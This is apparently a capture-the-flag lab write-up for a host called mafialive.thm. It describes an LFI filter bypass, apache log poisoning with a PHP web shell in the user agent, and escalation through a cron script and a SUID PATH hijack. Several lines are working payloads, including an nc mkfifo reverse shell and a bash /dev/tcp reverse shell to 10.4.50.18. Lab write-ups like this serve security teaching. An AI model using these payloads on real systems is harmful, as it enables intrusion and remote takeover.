nmap show open port 22,80
leak a virtual host mafialive.thm

bruteforce directory/looking at robots.txt reveal a test.php page

the page have a button that include a php via include
LFI exploittable, though it have a filter to ../.. and must include some path
Doubling the slash (//) bypass the first filter, and the second filter can be included in the lfi

First checking /etc/password via
`/var/www/html/development_testing//..//..//..//..//..//etc/password`

Then checking the test.php source via rot13 php filter
`php://filter/read=string.rot13/resource=/var/www/html/development_testing/test.php`

RCE via LFI can be achieved by poisoning the apache access log via the user agent.
`user-agent: <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`

and give reverse shell as cmd parameter:
`test.php?view=/var/www/html/development_testing//..//..//..//..//..//var//log//apache2//access.log&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.4.50.18+4182+>/tmp/f`
to get reverse shell

First horizontal privesc into archangel via a cronjob shell script, adding regular bash reverse script
`bash -i &> /dev/tcp/10.4.50.18/4182 0>&1`

Then escalating privilege to root by a root SUID executable that run a cp command.
make a cp file containing reverse shell bash script, then add the path into $PATH.
execute the SUID executable to get root.
